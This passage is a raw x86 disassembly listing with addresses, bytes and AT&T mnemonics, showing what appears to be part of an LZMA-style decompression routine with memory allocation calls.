  406c20:	41                   	inc    %ecx
  406c21:	4a                   	dec    %edx
  406c22:	75 e3                	jne    0x406c07
  406c24:	5f                   	pop    %edi
  406c25:	f7 d0                	not    %eax
  406c27:	5e                   	pop    %esi
  406c28:	c2 0c 00             	ret    $0xc
  406c2b:	b8 80 00 00 00       	mov    $0x80,%eax
  406c30:	48                   	dec    %eax
  406c31:	c6 04 08 00          	movb   $0x0,(%eax,%ecx,1)
  406c35:	75 f9                	jne    0x406c30
  406c37:	83 49 78 ff          	orl    $0xffffffff,0x78(%ecx)
  406c3b:	33 c0                	xor    %eax,%eax
  406c3d:	40                   	inc    %eax
  406c3e:	89 41 68             	mov    %eax,0x68(%ecx)
  406c41:	89 41 64             	mov    %eax,0x64(%ecx)
  406c44:	89 41 60             	mov    %eax,0x60(%ecx)
  406c47:	89 41 5c             	mov    %eax,0x5c(%ecx)
  406c4a:	c3                   	ret
  406c4b:	55                   	push   %ebp
  406c4c:	8b ec                	mov    %esp,%ebp
  406c4e:	81 ec 90 00 00 00    	sub    $0x90,%esp
  406c54:	53                   	push   %ebx
  406c55:	56                   	push   %esi
  406c56:	57                   	push   %edi
  406c57:	6a 22                	push   $0x22
  406c59:	8b f1                	mov    %ecx,%esi
  406c5b:	59                   	pop    %ecx
  406c5c:	8d bd 78 ff ff ff    	lea    -0x88(%ebp),%edi
  406c62:	89 b5 70 ff ff ff    	mov    %esi,-0x90(%ebp)
  406c68:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406c6a:	83 7d d0 ff          	cmpl   $0xffffffff,-0x30(%ebp)
  406c6e:	75 08                	jne    0x406c78
  406c70:	33 c0                	xor    %eax,%eax
  406c72:	40                   	inc    %eax
  406c73:	e9 20 0a 00 00       	jmp    0x407698
  406c78:	8b 5d bc             	mov    -0x44(%ebp),%ebx
  406c7b:	8b 75 ac             	mov    -0x54(%ebp),%esi
  406c7e:	8b 85 78 ff ff ff    	mov    -0x88(%ebp),%eax
  406c84:	83 f8 1c             	cmp    $0x1c,%eax
  406c87:	0f 87 08 0a 00 00    	ja     0x407695
  406c8d:	ff 24 85 9d 76 40 00 	jmp    *0x40769d(,%eax,4)
  406c94:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406c98:	0f 84 e2 09 00 00    	je     0x407680
  406c9e:	8b 45 90             	mov    -0x70(%ebp),%eax
  406ca1:	ff 4d 94             	decl   -0x6c(%ebp)
  406ca4:	ff 45 90             	incl   -0x70(%ebp)
  406ca7:	8a 00                	mov    (%eax),%al
  406ca9:	3c e1                	cmp    $0xe1,%al
  406cab:	0f 87 e4 09 00 00    	ja     0x407695
  406cb1:	0f b6 c0             	movzbl %al,%eax
  406cb4:	6a 2d                	push   $0x2d
  406cb6:	99                   	cltd
  406cb7:	59                   	pop    %ecx
  406cb8:	f7 f9                	idiv   %ecx
  406cba:	6a 09                	push   $0x9
  406cbc:	59                   	pop    %ecx
  406cbd:	8b f0                	mov    %eax,%esi
  406cbf:	0f b6 c2             	movzbl %dl,%eax
  406cc2:	99                   	cltd
  406cc3:	f7 f9                	idiv   %ecx
  406cc5:	8b ce                	mov    %esi,%ecx
  406cc7:	0f b6 fa             	movzbl %dl,%edi
  406cca:	33 d2                	xor    %edx,%edx
  406ccc:	89 7d c4             	mov    %edi,-0x3c(%ebp)
  406ccf:	42                   	inc    %edx
  406cd0:	d3 e2                	shl    %cl,%edx
  406cd2:	8b c8                	mov    %eax,%ecx
  406cd4:	4a                   	dec    %edx
  406cd5:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  406cd8:	33 d2                	xor    %edx,%edx
  406cda:	42                   	inc    %edx
  406cdb:	d3 e2                	shl    %cl,%edx
  406cdd:	8d 0c 37             	lea    (%edi,%esi,1),%ecx
  406ce0:	be 00 03 00 00       	mov    $0x300,%esi
  406ce5:	d3 e6                	shl    %cl,%esi
  406ce7:	4a                   	dec    %edx
  406ce8:	89 55 e8             	mov    %edx,-0x18(%ebp)
  406ceb:	81 c6 36 07 00 00    	add    $0x736,%esi
  406cf1:	8d 3c 36             	lea    (%esi,%esi,1),%edi
  406cf4:	3b 7d 88             	cmp    -0x78(%ebp),%edi
  406cf7:	74 26                	je     0x406d1f
  406cf9:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  406cfd:	74 09                	je     0x406d08
  406cff:	ff 75 fc             	push   -0x4(%ebp)
  406d02:	ff 15 0c 81 40 00    	call   *0x40810c
  406d08:	57                   	push   %edi
  406d09:	6a 40                	push   $0x40
  406d0b:	ff 15 10 81 40 00    	call   *0x408110
  406d11:	85 c0                	test   %eax,%eax
  406d13:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406d16:	0f 84 79 09 00 00    	je     0x407695
  406d1c:	89 7d 88             	mov    %edi,-0x78(%ebp)
  406d1f:	85 f6                	test   %esi,%esi
  406d21:	74 0c                	je     0x406d2f
  406d23:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406d26:	4e                   	dec    %esi
  406d27:	66 c7 04 70 00 04    	movw   $0x400,(%eax,%esi,2)
  406d2d:	75 f4                	jne    0x406d23
  406d2f:	83 65 b8 00          	andl   $0x0,-0x48(%ebp)
  406d33:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  406d37:	eb 26                	jmp    0x406d5f
  406d39:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406d3d:	0f 84 a6 08 00 00    	je     0x4075e9
  406d43:	8b 45 b8             	mov    -0x48(%ebp),%eax
  406d46:	ff 4d 94             	decl   -0x6c(%ebp)
  406d49:	8b c8                	mov    %eax,%ecx
  406d4b:	8b 45 90             	mov    -0x70(%ebp),%eax
  406d4e:	c1 e1 03             	shl    $0x3,%ecx
  406d51:	0f b6 00             	movzbl (%eax),%eax
  406d54:	d3 e0                	shl    %cl,%eax
  406d56:	09 45 c0             	or     %eax,-0x40(%ebp)
  406d59:	ff 45 90             	incl   -0x70(%ebp)
  406d5c:	ff 45 b8             	incl   -0x48(%ebp)
  406d5f:	83 7d b8 04          	cmpl   $0x4,-0x48(%ebp)
  406d63:	7c d4                	jl     0x406d39
  406d65:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406d68:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  406d6b:	74 28                	je     0x406d95
  406d6d:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  406d71:	89 45 8c             	mov    %eax,-0x74(%ebp)
  406d74:	74 09                	je     0x406d7f
  406d76:	ff 75 f8             	push   -0x8(%ebp)
  406d79:	ff 15 0c 81 40 00    	call   *0x40810c
  406d7f:	ff 75 c0             	push   -0x40(%ebp)
  406d82:	6a 40                	push   $0x40
  406d84:	ff 15 10 81 40 00    	call   *0x408110
  406d8a:	85 c0                	test   %eax,%eax
  406d8c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406d8f:	0f 84 00 09 00 00    	je     0x407695
  406d95:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406d98:	8b 4d 8c             	mov    -0x74(%ebp),%ecx
  406d9b:	c7 45 b8 05 00 00 00 	movl   $0x5,-0x48(%ebp)
  406da2:	80 64 08 ff 00       	andb   $0x0,-0x1(%eax,%ecx,1)
  406da7:	eb 21                	jmp    0x406dca
  406da9:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406dad:	0f 84 45 08 00 00    	je     0x4075f8
  406db3:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406db6:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406db9:	ff 4d 94             	decl   -0x6c(%ebp)
  406dbc:	0f b6 09             	movzbl (%ecx),%ecx
  406dbf:	c1 e0 08             	shl    $0x8,%eax
  406dc2:	0b c1                	or     %ecx,%eax
  406dc4:	ff 45 90             	incl   -0x70(%ebp)
  406dc7:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406dca:	8b 45 b8             	mov    -0x48(%ebp),%eax
  406dcd:	ff 4d b8             	decl   -0x48(%ebp)
  406dd0:	85 c0                	test   %eax,%eax
  406dd2:	75 d5                	jne    0x406da9
  406dd4:	8b 45 a0             	mov    -0x60(%ebp),%eax
  406dd7:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406dda:	23 45 e4             	and    -0x1c(%ebp),%eax
  406ddd:	c7 85 7c ff ff ff 06 	movl   $0x6,-0x84(%ebp)
  406de4:	00 00 00 
  406de7:	c1 e1 04             	shl    $0x4,%ecx
  406dea:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  406ded:	03 c8                	add    %eax,%ecx
  406def:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406df2:	8d 34 48             	lea    (%eax,%ecx,2),%esi
  406df5:	e9 6c 06 00 00       	jmp    0x407466
  406dfa:	33 d2                	xor    %edx,%edx
  406dfc:	39 55 c0             	cmp    %edx,-0x40(%ebp)
  406dff:	75 6f                	jne    0x406e70
  406e01:	0f b6 45 a4          	movzbl -0x5c(%ebp),%eax
  406e05:	8b 75 a0             	mov    -0x60(%ebp),%esi
  406e08:	b1 08                	mov    $0x8,%cl
  406e0a:	2a 4d c4             	sub    -0x3c(%ebp),%cl
  406e0d:	23 75 e8             	and    -0x18(%ebp),%esi
  406e10:	d3 e8                	shr    %cl,%eax
  406e12:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  406e15:	d3 e6                	shl    %cl,%esi
  406e17:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406e1a:	03 c6                	add    %esi,%eax
  406e1c:	8d 04 40             	lea    (%eax,%eax,2),%eax
  406e1f:	c1 e0 09             	shl    $0x9,%eax
  406e22:	83 7d c8 04          	cmpl   $0x4,-0x38(%ebp)
  406e26:	8d 84 08 6c 0e 00 00 	lea    0xe6c(%eax,%ecx,1),%eax
  406e2d:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406e30:	7d 05                	jge    0x406e37
  406e32:	89 55 c8             	mov    %edx,-0x38(%ebp)
  406e35:	eb 10                	jmp    0x406e47
  406e37:	83 7d c8 0a          	cmpl   $0xa,-0x38(%ebp)
  406e3b:	7d 06                	jge    0x406e43
  406e3d:	83 6d c8 03          	subl   $0x3,-0x38(%ebp)
  406e41:	eb 04                	jmp    0x406e47
  406e43:	83 6d c8 06          	subl   $0x6,-0x38(%ebp)
  406e47:	39 55 cc             	cmp    %edx,-0x34(%ebp)
  406e4a:	74 1c                	je     0x406e68
  406e4c:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406e4f:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  406e52:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  406e55:	72 03                	jb     0x406e5a
  406e57:	03 45 8c             	add    -0x74(%ebp),%eax
  406e5a:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  406e5d:	33 db                	xor    %ebx,%ebx
  406e5f:	43                   	inc    %ebx
  406e60:	8a 04 08             	mov    (%eax,%ecx,1),%al
  406e63:	88 45 a5             	mov    %al,-0x5b(%ebp)
  406e66:	eb 68                	jmp    0x406ed0
  406e68:	33 db                	xor    %ebx,%ebx
  406e6a:	43                   	inc    %ebx
  406e6b:	e9 cd 01 00 00       	jmp    0x40703d
  406e70:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406e73:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406e76:	c7 45 cc 01 00 00 00 	movl   $0x1,-0x34(%ebp)
  406e7d:	c7 85 7c ff ff ff 07 	movl   $0x7,-0x84(%ebp)
  406e84:	00 00 00 
  406e87:	8d b4 48 80 01 00 00 	lea    0x180(%eax,%ecx,2),%esi
  406e8e:	e9 d3 05 00 00       	jmp    0x407466
  406e93:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406e97:	0f 84 67 07 00 00    	je     0x407604
  406e9d:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406ea0:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406ea3:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406ea7:	0f b6 09             	movzbl (%ecx),%ecx
  406eaa:	ff 4d 94             	decl   -0x6c(%ebp)
  406ead:	c1 e0 08             	shl    $0x8,%eax
  406eb0:	0b c1                	or     %ecx,%eax
  406eb2:	ff 45 90             	incl   -0x70(%ebp)
  406eb5:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406eb8:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406ebb:	39 45 b8             	cmp    %eax,-0x48(%ebp)
  406ebe:	0f 85 ad 00 00 00    	jne    0x406f71
  406ec4:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  406eca:	0f 8d 05 01 00 00    	jge    0x406fd5
  406ed0:	0f b6 45 a5          	movzbl -0x5b(%ebp),%eax
  406ed4:	d0 65 a5             	shlb   $1,-0x5b(%ebp)
  406ed7:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  406eda:	c1 e8 07             	shr    $0x7,%eax
  406edd:	89 45 b8             	mov    %eax,-0x48(%ebp)
  406ee0:	40                   	inc    %eax
  406ee1:	c1 e0 08             	shl    $0x8,%eax
  406ee4:	03 c3                	add    %ebx,%eax
  406ee6:	8d 34 41             	lea    (%ecx,%eax,2),%esi
  406ee9:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406eec:	c1 e9 0b             	shr    $0xb,%ecx
  406eef:	66 8b 06             	mov    (%esi),%ax
  406ef2:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406ef5:	0f b7 d0             	movzwl %ax,%edx
  406ef8:	0f af ca             	imul   %edx,%ecx
  406efb:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406efe:	73 1a                	jae    0x406f1a
  406f00:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  406f04:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406f07:	b9 00 08 00 00       	mov    $0x800,%ecx
  406f0c:	2b ca                	sub    %edx,%ecx
  406f0e:	c1 f9 05             	sar    $0x5,%ecx
  406f11:	03 c8                	add    %eax,%ecx
  406f13:	03 db                	add    %ebx,%ebx
  406f15:	66 89 0e             	mov    %cx,(%esi)
  406f18:	eb 1d                	jmp    0x406f37
  406f1a:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406f1d:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406f20:	66 8b c8             	mov    %ax,%cx
  406f23:	c7 45 c0 01 00 00 00 	movl   $0x1,-0x40(%ebp)
  406f2a:	66 c1 e9 05          	shr    $0x5,%cx
  406f2e:	2b c1                	sub    %ecx,%eax
  406f30:	8d 5c 1b 01          	lea    0x1(%ebx,%ebx,1),%ebx
  406f34:	66 89 06             	mov    %ax,(%esi)
  406f37:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406f3e:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406f41:	0f 83 71 ff ff ff    	jae    0x406eb8
  406f47:	e9 47 ff ff ff       	jmp    0x406e93
  406f4c:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406f50:	0f 84 ba 06 00 00    	je     0x407610
  406f56:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406f59:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406f5c:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406f60:	0f b6 09             	movzbl (%ecx),%ecx
  406f63:	ff 4d 94             	decl   -0x6c(%ebp)
  406f66:	c1 e0 08             	shl    $0x8,%eax
  406f69:	0b c1                	or     %ecx,%eax
  406f6b:	ff 45 90             	incl   -0x70(%ebp)
  406f6e:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406f71:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  406f77:	7d 5c                	jge    0x406fd5
  406f79:	8b 45 a8             	mov    -0x58(%ebp),%eax
  406f7c:	8d 14 1b             	lea    (%ebx,%ebx,1),%edx
  406f7f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406f82:	8d 34 02             	lea    (%edx,%eax,1),%esi
  406f85:	c1 e9 0b             	shr    $0xb,%ecx
  406f88:	66 8b 06             	mov    (%esi),%ax
  406f8b:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406f8e:	0f b7 f8             	movzwl %ax,%edi
  406f91:	0f af cf             	imul   %edi,%ecx
  406f94:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406f97:	73 16                	jae    0x406faf
  406f99:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406f9c:	b9 00 08 00 00       	mov    $0x800,%ecx
  406fa1:	2b cf                	sub    %edi,%ecx
  406fa3:	c1 f9 05             	sar    $0x5,%ecx
  406fa6:	03 c8                	add    %eax,%ecx
  406fa8:	03 db                	add    %ebx,%ebx
  406faa:	66 89 0e             	mov    %cx,(%esi)
  406fad:	eb 15                	jmp    0x406fc4
  406faf:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406fb2:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406fb5:	66 8b c8             	mov    %ax,%cx
  406fb8:	8d 5a 01             	lea    0x1(%edx),%ebx
  406fbb:	66 c1 e9 05          	shr    $0x5,%cx
  406fbf:	2b c1                	sub    %ecx,%eax
  406fc1:	66 89 06             	mov    %ax,(%esi)
  406fc4:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406fcb:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406fce:	73 a1                	jae    0x406f71
  406fd0:	e9 77 ff ff ff       	jmp    0x406f4c
  406fd5:	83 65 cc 00          	andl   $0x0,-0x34(%ebp)
  406fd9:	8a 45 bc             	mov    -0x44(%ebp),%al
  406fdc:	88 45 a4             	mov    %al,-0x5c(%ebp)
  406fdf:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  406fe3:	0f 84 3f 06 00 00    	je     0x407628
  406fe9:	8b 4d 98             	mov    -0x68(%ebp),%ecx
  406fec:	8a 45 a4             	mov    -0x5c(%ebp),%al
  406fef:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406ff2:	ff 45 a0             	incl   -0x60(%ebp)
  406ff5:	ff 45 98             	incl   -0x68(%ebp)
  406ff8:	ff 4d 9c             	decl   -0x64(%ebp)
  406ffb:	88 01                	mov    %al,(%ecx)
  406ffd:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  407000:	88 04 11             	mov    %al,(%ecx,%edx,1)
  407003:	8d 41 01             	lea    0x1(%ecx),%eax
  407006:	33 d2                	xor    %edx,%edx
  407008:	f7 75 8c             	divl   -0x74(%ebp)
  40700b:	e9 95 01 00 00       	jmp    0x4071a5
  407010:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  407014:	0f 84 02 06 00 00    	je     0x40761c
  40701a:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  40701d:	8b 45 f4             	mov    -0xc(%ebp),%eax
  407020:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  407024:	0f b6 09             	movzbl (%ecx),%ecx
  407027:	ff 4d 94             	decl   -0x6c(%ebp)
  40702a:	c1 e0 08             	shl    $0x8,%eax
  40702d:	0b c1                	or     %ecx,%eax
  40702f:	ff 45 90             	incl   -0x70(%ebp)
  407032:	89 45 f4             	mov    %eax,-0xc(%ebp)
  407035:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  40703b:	7d 9c                	jge    0x406fd9
  40703d:	8b 45 a8             	mov    -0x58(%ebp),%eax
  407040:	8d 14 1b             	lea    (%ebx,%ebx,1),%edx
  407043:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  407046:	8d 34 02             	lea    (%edx,%eax,1),%esi
  407049:	c1 e9 0b             	shr    $0xb,%ecx
  40704c:	66 8b 06             	mov    (%esi),%ax
  40704f:	89 75 ac             	mov    %esi,-0x54(%ebp)
  407052:	0f b7 f8             	movzwl %ax,%edi
  407055:	0f af cf             	imul   %edi,%ecx
  407058:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  40705b:	73 16                	jae    0x407073
  40705d:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  407060:	b9 00 08 00 00       	mov    $0x800,%ecx
  407065:	2b cf                	sub    %edi,%ecx
  407067:	c1 f9 05             	sar    $0x5,%ecx
  40706a:	03 c8                	add    %eax,%ecx
  40706c:	03 db                	add    %ebx,%ebx
  40706e:	66 89 0e             	mov    %cx,(%esi)
  407071:	eb 15                	jmp    0x407088
  407073:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  407076:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  407079:	66 8b c8             	mov    %ax,%cx
  40707c:	8d 5a 01             	lea    0x1(%edx),%ebx
  40707f:	66 c1 e9 05          	shr    $0x5,%cx
  407083:	2b c1                	sub    %ecx,%eax
  407085:	66 89 06             	mov    %ax,(%esi)
  407088:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  40708f:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  407092:	73 a1                	jae    0x407035
  407094:	e9 77 ff ff ff       	jmp    0x407010
  407099:	83 7d c0 01          	cmpl   $0x1,-0x40(%ebp)
  40709d:	75 1c                	jne    0x4070bb
  40709f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4070a2:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  4070a5:	c7 85 7c ff ff ff 08 	movl   $0x8,-0x84(%ebp)
  4070ac:	00 00 00 
  4070af:	8d b4 48 98 01 00 00 	lea    0x198(%eax,%ecx,2),%esi
  4070b6:	e9 ab 03 00 00       	jmp    0x407466
  4070bb:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4070be:	c7 45 80 16 00 00 00 	movl   $0x16,-0x80(%ebp)
  4070c5:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4070c8:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4070cb:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4070ce:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4070d1:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4070d4:	33 c0                	xor    %eax,%eax
  4070d6:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  4070da:	0f 9d c0             	setge  %al
  4070dd:	48                   	dec    %eax
  4070de:	24 fd                	and    $0xfd,%al
  4070e0:	83 c0 0a             	add    $0xa,%eax
  4070e3:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4070e6:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4070e9:	05 64 06 00 00       	add    $0x664,%eax
  4070ee:	89 45 a8             	mov    %eax,-0x58(%ebp)
  4070f1:	8b 75 a8             	mov    -0x58(%ebp),%esi
  4070f4:	c7 85 7c ff ff ff 12 	movl   $0x12,-0x84(%ebp)
  4070fb:	00 00 00 
  4070fe:	e9 63 03 00 00       	jmp    0x407466
  407103:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  407107:	75 21                	jne    0x40712a
  407109:	8b 45 c8             	mov    -0x38(%ebp),%eax
  40710c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40710f:	83 c0 0f             	add    $0xf,%eax
  407112:	c7 85 7c ff ff ff 09 	movl   $0x9,-0x84(%ebp)
  407119:	00 00 00 
  40711c:	c1 e0 04             	shl    $0x4,%eax
  40711f:	03 45 b4             	add    -0x4c(%ebp),%eax
  407122:	8d 34 41             	lea    (%ecx,%eax,2),%esi
  407125:	e9 3c 03 00 00       	jmp    0x407466
  40712a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40712d:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  407130:	c7 85 7c ff ff ff 0a 	movl   $0xa,-0x84(%ebp)
  407137:	00 00 00 
  40713a:	8d b4 48 b0 01 00 00 	lea    0x1b0(%eax,%ecx,2),%esi
  407141:	e9 20 03 00 00       	jmp    0x407466
  407146:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  40714a:	0f 85 b1 00 00 00    	jne    0x407201
  407150:	83 7d a0 00          	cmpl   $0x0,-0x60(%ebp)
  407154:	0f 84 3b 05 00 00    	je     0x407695
  40715a:	33 c0                	xor    %eax,%eax
  40715c:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  407160:	0f 9d c0             	setge  %al
  407163:	8d 44 00 09          	lea    0x9(%eax,%eax,1),%eax
  407167:	89 45 c8             	mov    %eax,-0x38(%ebp)
  40716a:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  40716e:	0f 84 c0 04 00 00    	je     0x407634
  407174:	8b 45 ec             	mov    -0x14(%ebp),%eax
  407177:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  40717a:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  40717d:	72 03                	jb     0x407182
  40717f:	03 45 8c             	add    -0x74(%ebp),%eax
  407182:	8b 55 f8             	mov    -0x8(%ebp),%edx
  407185:	8a 0c 10             	mov    (%eax,%edx,1),%cl
  407188:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40718b:	88 4d a4             	mov    %cl,-0x5c(%ebp)
  40718e:	88 0c 10             	mov    %cl,(%eax,%edx,1)
  407191:	40                   	inc    %eax
  407192:	33 d2                	xor    %edx,%edx
  407194:	f7 75 8c             	divl   -0x74(%ebp)
  407197:	8b 45 98             	mov    -0x68(%ebp),%eax
  40719a:	ff 45 a0             	incl   -0x60(%ebp)
  40719d:	ff 45 98             	incl   -0x68(%ebp)
  4071a0:	ff 4d 9c             	decl   -0x64(%ebp)
  4071a3:	88 08                	mov    %cl,(%eax)
  4071a5:	89 55 ec             	mov    %edx,-0x14(%ebp)
  4071a8:	c7 85 78 ff ff ff 02 	movl   $0x2,-0x88(%ebp)
  4071af:	00 00 00 
  4071b2:	e9 c7 fa ff ff       	jmp    0x406c7e
  4071b7:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  4071bb:	75 05                	jne    0x4071c2
  4071bd:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4071c0:	eb 36                	jmp    0x4071f8
  4071c2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4071c5:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  4071c8:	c7 85 7c ff ff ff 0b 	movl   $0xb,-0x84(%ebp)
  4071cf:	00 00 00 
  4071d2:	8d b4 48 c8 01 00 00 	lea    0x1c8(%eax,%ecx,2),%esi
  4071d9:	e9 88 02 00 00       	jmp    0x407466
  4071de:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  4071e2:	75 05                	jne    0x4071e9
  4071e4:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4071e7:	eb 09                	jmp    0x4071f2
  4071e9:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4071ec:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4071ef:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  4071f2:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  4071f5:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  4071f8:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  4071fb:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4071fe:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  407201:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407204:	c7 45 80 15 00 00 00 	movl   $0x15,-0x80(%ebp)
  40720b:	05 68 0a 00 00       	add    $0xa68,%eax
  407210:	89 45 a8             	mov    %eax,-0x58(%ebp)
  407213:	e9 d9 fe ff ff       	jmp    0x4070f1
  407218:	33 c0                	xor    %eax,%eax
  40721a:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  40721e:	0f 9d c0             	setge  %al
  407221:	48                   	dec    %eax
  407222:	24 fd                	and    $0xfd,%al
  407224:	83 c0 0b             	add    $0xb,%eax
  407227:	89 45 c8             	mov    %eax,-0x38(%ebp)
  40722a:	e9 9a 01 00 00       	jmp    0x4073c9
  40722f:	8b 45 d0             	mov    -0x30(%ebp),%eax
  407232:	83 f8 04             	cmp    $0x4,%eax
  407235:	7c 03                	jl     0x40723a
  407237:	6a 03                	push   $0x3
  407239:	58                   	pop    %eax
  40723a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40723d:	c7 45 c0 06 00 00 00 	movl   $0x6,-0x40(%ebp)
  407244:	c1 e0 07             	shl    $0x7,%eax
  407247:	c7 45 84 19 00 00 00 	movl   $0x19,-0x7c(%ebp)
  40724e:	8d 84 08 60 03 00 00 	lea    0x360(%eax,%ecx,1),%eax
  407255:	89 45 a8             	mov    %eax,-0x58(%ebp)
  407258:	e9 ce 02 00 00       	jmp    0x40752b
  40725d:	83 fb 04             	cmp    $0x4,%ebx
  407260:	7c 34                	jl     0x407296
  407262:	8b cb                	mov    %ebx,%ecx
  407264:	8b c3                	mov    %ebx,%eax
  407266:	d1 f9                	sar    $1,%ecx
  407268:	83 e0 01             	and    $0x1,%eax
  40726b:	49                   	dec    %ecx
  40726c:	0c 02                	or     $0x2,%al
  40726e:	d3 e0                	shl    %cl,%eax
  407270:	83 fb 0e             	cmp    $0xe,%ebx
  407273:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  407276:	7d 14                	jge    0x40728c
  407278:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40727b:	2b c3                	sub    %ebx,%eax
  40727d:	89 4d c0             	mov    %ecx,-0x40(%ebp)
  407280:	8d 84 42 5e 05 00 00 	lea    0x55e(%edx,%eax,2),%eax
  407287:	e9 81 00 00 00       	jmp    0x40730d
  40728c:	33 db                	xor    %ebx,%ebx
  40728e:	83 c1 fc             	add    $0xfffffffc,%ecx
  407291:	89 4d b8             	mov    %ecx,-0x48(%ebp)
  407294:	eb 33                	jmp    0x4072c9
  407296:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  407299:	e9 28 01 00 00       	jmp    0x4073c6
